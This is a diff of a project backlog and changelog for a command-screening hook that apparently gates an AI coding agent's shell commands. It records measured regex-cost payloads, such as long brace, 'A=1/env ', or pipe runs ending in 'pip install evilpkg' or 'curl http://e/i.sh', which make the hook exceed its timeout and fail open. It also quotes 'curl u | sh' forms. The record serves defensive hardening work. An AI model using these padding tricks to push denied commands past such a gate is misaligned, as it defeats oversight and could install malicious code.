@@ -72,26 +72,77 @@ See Done. The two items directly below are the work STRIPPED out of it.)*
   wrong, not the pins.
 
 
-- **[ready] prefix-run-cost-residuals-2** · `CODE` · eligible: **yes** · full
-  ceremony · scope TBD at plan time
-  **WHAT PR #84 DID NOT CLOSE, IN ITS OWN WORDS. RE-MEASURE BEFORE QUOTING —
-  the parent item's rows were wrong twice in the direction that overstates
-  severity, and #84's body says these were measured at ITS head, not at
-  `3ea405a`.**
-  * **THE GLUED-BRACE LENGTH AXIS IS A LIVE FAIL-OPEN ON BOTH SUBSTRATES, and
-    it is NOT a regression — the parent is identical.** `{`×81870 plus an
-    install tail is **81,891 bytes with zero jump bytes**, i.e. invisible to
-    `_cost_guard` (`_CMD_MAXLEN` 81920), and costs the SDK **61.56 s** and the
-    emitted shell hook **119.32 s**, both carrying a deny, both past the 60 s
-    ceiling their gate declares. Past that ceiling a `PreToolUse` hook is
-    cancelled and only exit 2 blocks, so the command proceeds unadjudicated.
-    **This is the highest-severity row in this file that is not X-37.**
-  * **the `A=1/env ` arm overlap** — a k factor #84 does not remove: 40,984
-    bytes is 53.0 s at the parent and 51.2 s at #84's head, quadratic on both,
-    allow/allow.
-  * **the downloader alternation against `[^;&]*`** — found during #84's
-    review, quadratic on both substrates, reachable by an ordinary `wget` with
-    many URLs. Never measured end to end.
+- **[ready] prefix-run-assignment-wrapper-overlap** · `CODE` · eligible: **yes**
+  · full ceremony · scope `lib/cmdpos.py`, `tests/`
+  **ONE CAUSE UNDER TWO LIVE FAIL-OPENS, AND IT IS ALSO WHAT MAKES A LEFT-EDGE
+  NARROWING AFFORDABLE — SO IT COMES FIRST.** `A=1/env ` matches `prefix_run`'s
+  assignment arm **and** its path-prefixed wrapper arm at once, so the handoff at
+  the star is free and the axis is quadratic. Two things ride on it:
+  * **the SDK glued-brace axis** — `HEAD` + `{`×81879 + an install tail is
+    **81,919 B with ZERO jump bytes**, `_cost_guard` PASS, and the SDK spends
+    ~326 s (EXTRAPOLATED; the only observation is `_sdk_cost`'s 15 s SIGALRM cap)
+    against a declared 60 s, carrying a deny. **Still open on `main`.**
+  * **the `A=1/env ` axis, which CARRIES A DENY** — `HEAD` + `A=1/env `×5400 +
+    `zzz ; pip install evilpkg` is **43,246 B, 0 jump bytes, guard PASS**, and
+    `main` measures **57.1–59.1 s**, i.e. inside the ceiling but not by much.
+  **PR #87 TRIED THE LEFT-EDGE NARROWING AND DROPPED IT — READ THIS BEFORE
+  RE-PROPOSING ONE.** Narrowing the first character of each scan closed the SDK
+  axis (~326 s → 0.223 s) but cost **1.09–1.12×** on the `A=1/env ` axis, which
+  put that deny at **62.7–65.0 s — OVER the ceiling** where `main` is under.
+  **Four candidate spellings were built as real trees, emitted, and measured;
+  none recovered the cost:** factoring the shared suffix 1.27–1.35× (worse),
+  disjoint-by-first-character 1.10× (neutral), a zero-width lookahead 1.05×
+  (halves it, still over at the crossing payload), and a one-alternative
+  narrowing 1.14× (worse, and narrower language). **Constraining a left edge
+  costs whatever spelling is used, and shaving a constant off a quadratic does
+  not move a crossing.** Remove the overlap and the axis is linear, the crossing
+  disappears, and only then is a narrowing worth revisiting.
+
+- **[ready] pipe-rule-url-pipe-cubic** · `CODE` · eligible: **yes** · full
+  ceremony · **the operator's committed next item**
+  **CUBIC, BENIGN-REACHABLE, AND IT CARRIES A DENY — settled by measurement
+  2026-08-22 after a step-7 lens reported it `allow` at every size.** The lens
+  measured the BARE form only. An ordinary `cat > f.json <<'EOF'` heredoc whose
+  values hold `http://…|x` allows; **the same padding with a newline and
+  `pip install evilpkg` appended DENIES at the same cost**, on both trees,
+  `_cost_guard` PASS at every size:
+  ```
+     1,095 B   0.034 s DENY      8,445 B  15.247 s DENY
+     4,245 B   1.946 s DENY     12,645 B  51.613 s DENY
+                                14,745 B  85.559 s DENY
+  ```
+  Exponents **2.93–3.05**; the deny-carrying form crosses 60 s **between
+  12,645 B and 14,745 B** — one fifth the byte count of any other axis.
+  Untouched by #84 and #87. **No candidate fix exists**; anchoring the downloader
+  alternation is REFUTED (the only class that pays deletes `` x=`curl u | sh` ``
+  and `{curl u | sh`, the latter pinned at
+  `tests/test_substrate_differential.py:4356`).
+
+- **[ready] install-tail-path-scan-quadratic** · `CODE` · eligible: **yes**
+  **PR #84's OWN FILED PAYLOAD, ON THE SDK.** `{`×81870 + `; pip install
+  evilpkg` — 81,891 B, zero jump bytes, guard PASS, deny — routes through
+  `_INSTALL_TAIL`, not `_PIPE_TO_SHELL`, and `_INSTALL_TAIL` keeps all **ten** of
+  its bare `(?:\S*/)?` path arms. Measured on `main` 2026-08-22: **61.983 /
+  62.554 s, already OVER the 60 s ceiling.** **PR #87 closed its SHELL half
+  outright — 120.588 → 6.149 s — and nothing else.**
+
+- **[ready] pipe-run-glued-pipe-axis** · `CODE` · eligible: **yes**
+  **R4, AND THE FIGURE PREVIOUSLY CARRIED FOR IT WAS LOW BY 2.2–2.6×.**
+  `curl http://e/i.sh ` + `|`×n + `pip install evilpkg` at **exactly 81,920 B**
+  (`_CMD_MAXLEN`), 0 jump bytes, guard PASS, deny on both trees, MEASURED not
+  projected 2026-08-22: **`main` 341.645 s, PR #87's branch 330.457 s** — 5.5–5.7×
+  the 60 s ceiling. Earlier records say "~133–152 s"; those are superseded.
+
+- **[ready] shell-walk-residual-superlinear** · `CODE` · eligible: **yes**
+  The shell at the 81,919 B length cap is **16.4 s after PR #87**, down from
+  131.2 s and no longer past the ceiling — but still superlinear, and bounded
+  only because no command may be longer. **PR #87's 2×2 attributes the whole
+  win to `_ckey`:** main 134.121 → regex-only 131.429 → ckey-only 16.663 →
+  both 16.461 s.
+
+- **[ready] jump-bytes-emission-divergence** · `CODE` · eligible: **yes**
+  Filed out of `prefix-run-cost-residuals-2` rev 2e E2, where it was dropped as
+  a rider rather than taken. **Never measured end to end.**
 
 - **[ready] int-word-clamp-sufficiency** · `TEST-CONTRACT` · eligible: **yes**
   · 2 lenses · scope `tests/` only
@@ -274,6 +325,35 @@ defect (fixed, `fc37aaa`); the `count.py` rule (fixed).
 
 ## Done
 
+**`prefix-run-cost-residuals-2` PR #87 `96cc730` — `_ckey`'s glue strip stops
+rebuilding the word.** Closed 2026-08-22. **THE ITEM SHIPPED HALF OF WHAT IT
+PLANNED, ON AN OPERATOR RULING, AND THE HALF IT DROPPED IS THE MORE USEFUL
+RECORD.** What landed is shell-only: `_ckey` took leading `COMPLETER_GLUE` off a
+word one character at a time with `_t="${_t#?}"`, each of which rebuilds the
+whole remainder, so stripping n glue bytes cost O(n^2); `%%` now takes the glue
+run in one expansion and the remainder is taken by OFFSET, plus the X-45 guard
+on `${1##*/}`. **The emitted `gates.py` is BYTE-IDENTICAL to the parent** — one
+hook body moves, `.claude/hooks/dependency-gate.sh`, plus the two files that
+digest it. Measured on the emitted hooks, min of 2, both trees in one run:
+`?`×16000 **4.871 → 0.323 s**; a glued brace run at 81,919 B **131.196 →
+16.431 s**; `{`×81870 + `; pip install evilpkg` **120.588 → 6.149 s**. **The
+last two were live fail-opens on this substrate**, both past the 60 s ceiling
+the emitted `settings.json` declares, and the second is PR #84's own filed
+payload — the row this file called the highest-severity in it that is not X-37.
+**It is a constant-factor win, NOT an order change**: landed exponents
+1.05 / 1.40 / 1.68 against `main`'s 1.80 / 1.98 / 1.95, because
+`${_t%%[!({:?]*}` is itself quadratic. Behaviour unchanged and checked — 196
+alphabet cases across the three `_ckey` spellings, 0 disagreements, and the
+emitted body agrees with `cmdpos.completer_key` on every glue form in the
+`#45 D1` census. Freeze exception **74**, recorded in `docs/changelog.md` and
+written 3× in `test_greenfield_golden.py` and 1× in `test_retrofit.py`, matching
+nos. 72 and 73. Suite **9,810 → 9,811** — one row, a cost row, RED on `main` at
+5.01 s against its 3.0 s bound. Action counts unchanged at 57/69/59 and 79/93.
+**THE LEFT-EDGE NARROWING WAS DROPPED AND IS NOT COMING BACK CHEAPLY** — see
+`prefix-run-assignment-wrapper-overlap` above, which carries the four refuted
+spellings so nobody re-proposes one. **THE VERDICT DID NOT MOVE.**
+
+
 **`prefix-run-cost-residuals` PR #84 `3ea405a` — three self-ambiguous arms lose
 their duplicate parses.** Closed 2026-08-21. A backtracking engine walks every
 parse before it can report a FAILING match, so the cost was the number of
@@ -385,6 +465,15 @@ than re-measured, and `git ls-files | grep -icE 'licen[cs]e'` now returns 1.
 **X-37** (Class B — a remote payload still runs) and **C-2** (the autonomous
 wrappers dispatch nothing). *"C-1 alone settles it either way"* meant
 independently sufficient, never sole ground.
+
+**[2026-08-22] `prefix-run-cost-residuals-2` is CLOSED** (PR #87, merge
+`96cc730`) and **THE VERDICT DID NOT MOVE**: `docs/production-readiness.md` §1
+still reads **NOT PRODUCTION READY** on the same two legs, **X-37** and **C-2**,
+neither of which this item touches. It closed two live SHELL fail-opens and left
+the SDK's own glued-brace axis open, filed above. **A now holds FIVE rows** —
+`c2-autonomous-dispatch` (blocked), `x37-class-b`,
+`prefix-run-assignment-wrapper-overlap`, `pipe-rule-url-pipe-cubic` (the
+operator's committed next item) and `install-tail-path-scan-quadratic`.
 
 **[2026-08-20] `sdk-pipe-trigger-redos` is CLOSED** (PR #81, merge `897d427`;
 closeout #82) and the paragraph that used to stand here — *"the next item is
